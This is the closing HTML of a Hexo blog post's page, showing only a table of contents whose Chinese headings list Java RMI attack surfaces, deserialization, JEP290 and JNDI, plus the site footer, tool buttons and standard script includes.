href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%83%A8%E5%88%86-1"><span class="nav-text">服务端部分</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI-%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">RMI 攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="nav-text">远程类加载</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="nav-text">代码示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">攻击服务端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="nav-text">攻击注册中心</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="nav-text">攻击客户端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BBDGC"><span class="nav-text">攻击DGC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JEP290"><span class="nav-text">JEP290</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%EF%BC%88Java-Naming-and-Directory-Interface%EF%BC%89"><span class="nav-text">JNDI（Java Naming and Directory Interface）</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        50 posts in total
                    </span>
                    
                        <span>
                            811.2k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>